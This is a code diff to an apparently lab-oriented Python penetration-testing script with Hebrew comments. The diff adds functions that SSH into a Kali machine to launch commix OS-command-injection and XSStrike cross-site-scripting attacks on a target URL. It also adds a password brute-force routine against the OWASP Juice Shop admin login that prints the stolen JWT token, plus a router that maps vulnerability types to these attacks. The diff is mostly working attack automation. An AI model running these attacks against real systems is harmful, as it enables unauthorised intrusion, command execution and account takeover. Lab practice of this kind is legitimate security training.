@@ -9,6 +9,7 @@ import paramiko
 import threading
 import json
 import re
+import requests
 
 try:
   from zapv2 import ZAPv2
@@ -262,10 +263,129 @@ def run_remote_nuclei(target_url: str, kali_ip: str, results_list: list) -> None
     finally:
         ssh.close()
 
+def run_remote_commix(target_url: str, kali_ip: str) -> None:
+    print(f"\n[!] Initiating automated Commix OS-Injection attack on: {target_url}")
+    
+    # === ניקוי ה-URL ===
+    # אנחנו מנקים את הפיילוד ש-ZAP שלח, כדי לתת ל-Commix להתחיל את ההזרקות שלו מדף נקי
+    clean_url = re.sub(r'q=.*', 'q=1', target_url)
+    print(f"[*] Sanitized URL for Commix: {clean_url}")
+    
+    username = os.getenv("KALI_USER", "kali")
+    password = os.getenv("KALI_PASSWORD", "kali")
+    
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    try:
+        print(f"[*] Connecting to Kali ({kali_ip}) via SSH...")
+        ssh.connect(hostname=kali_ip, username=username, password=password)
+        
+        # בניית פקודת התקיפה:
+        # --batch: מונע שאלות אינטראקטיביות (Yes/No) שעלולות לתקוע את הסקריפט
+        # --current-user: אם ההתקפה מצליחה, תדפיס איזה משתמש מריץ את השרת (לרוב www-data או root)
+        # --hostname: ידפיס את שם השרת כדי להוכיח RCE
+        # 2>&1: תופס את כל הפלט, גם אם הוא נזרק לערוץ השגיאות
+        #commix_cmd = f"commix --url {clean_url} --batch --current-user --hostname 2>&1"
+        commix_cmd = f"commix --url {clean_url} --batch -v 3 --current-user --hostname 2>&1"
+        print(f"[*] Executing payload: {commix_cmd}")
+        
+        stdin, stdout, stderr = ssh.exec_command(commix_cmd)
+        
+        print("\n=== COMMIX REAL-TIME OUTPUT ===")
+        # קריאה והדפסה בזמן אמת, בדיוק כמו שעשינו ב-SQLMap
+        for line in stdout:
+            print(line.strip())
+        print("=============================\n")
+            
+    except Exception as e:
+        print(f"[-] Automated Commix attack failed: {e}")
+    finally:
+        ssh.close()
+
+def run_custom_admin_hijacker(target_url: str, kali_ip: str) -> None:
+    print(f"\n[!] Initiating Custom API Attack: Admin Account Hijacking...")
+    
+    # חילוץ כתובת הבסיס (http://192.168.190.129:3000)
+    from urllib.parse import urlparse
+    parsed = urlparse(target_url)
+    base_url = f"{parsed.scheme}://{parsed.netloc}"
+    
+    login_api = f"{base_url}/rest/user/login"
+    print(f"[*] Targeting Login API: {login_api}")
+    
+    # רשימת סיסמאות נפוצות (במציאות זה יהיה קובץ של אלפים, פה נשים את הקלאסיות)
+    passwords_to_try = ["123456", "password", "admin", "admin123", "admin@123", "root"]
+    admin_email = "admin@juice-sh.op" # האימייל הקבוע של מנהל ה-Juice Shop
+    
+    success = False
+    
+    for pwd in passwords_to_try:
+        print(f"[*] Trying credentials -> {admin_email} : {pwd}")
+        
+        # מבנה הבקשה ש-Juice Shop מצפה לקבל
+        payload = {"email": admin_email, "password": pwd}
+        
+        try:
+            response = requests.post(login_api, json=payload, timeout=5)
+            
+            # אם קיבלנו 200, הפריצה הצליחה!
+            if response.status_code == 200:
+                data = response.json()
+                token = data.get('authentication', {}).get('token', 'NO_TOKEN')
+                print("\n" + "="*40)
+                print("[+++] CRITICAL VULNERABILITY EXPLOITED [+++]")
+                print("[+] Admin account compromised successfully!")
+                print(f"[+] Password found: {pwd}")
+                print(f"[+] Admin JWT Token stolen:\n{token}")
+                print("="*40 + "\n")
+                success = True
+                break
+        except requests.exceptions.RequestException as e:
+            print(f"[-] Request failed: {e}")
+            
+    if not success:
+        print("[-] Brute force failed. Password might be complex.")
+
+def run_remote_xsstrike(target_url: str, kali_ip: str) -> None:
+    print(f"\n[!] Initiating Advanced XSS Analysis with XSStrike on: {target_url}")
+    
+    # ניקוי ה-URL
+    clean_url = re.sub(r'q=.*', 'q=1', target_url)
+    
+    username = os.getenv("KALI_USER", "kali")
+    password = os.getenv("KALI_PASSWORD", "kali")
+    
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    try:
+        ssh.connect(hostname=kali_ip, username=username, password=password)
+        
+        # פקודת התקיפה:
+        # --crawl: סורק גם דפים מקושרים
+        # --blind: בודק חולשות XSS עיוורות (כאלו שנשמרות בשרת ומופעלות אצל משתמש אחר)
+        xsstrike_cmd = f"python3 /usr/share/xsstrike/xsstrike.py -u \"{clean_url}\" --crawl --blind --console-log-level info 2>&1"
+        
+        print(f"[*] Executing XSStrike: {xsstrike_cmd}")
+        stdin, stdout, stderr = ssh.exec_command(xsstrike_cmd)
+        
+        print("\n=== XSSTRIKE REAL-TIME OUTPUT ===")
+        for line in stdout:
+            print(line.strip())
+        print("================================\n")
+            
+    except Exception as e:
+        print(f"[-] XSStrike attack failed: {e}")
+    finally:
+        ssh.close()
+
 EXPLOIT_ROUTER = {
     "sql injection": run_remote_sqlmap,
+    "os command injection": run_remote_commix,
+    "injection": run_custom_admin_hijacker,
+    "cross site scripting": run_remote_xsstrike,
     # "default credentials": run_remote_hydra,  
-    # "cross site scripting": run_remote_xss_tool 
 }
 
 def main() -> int:
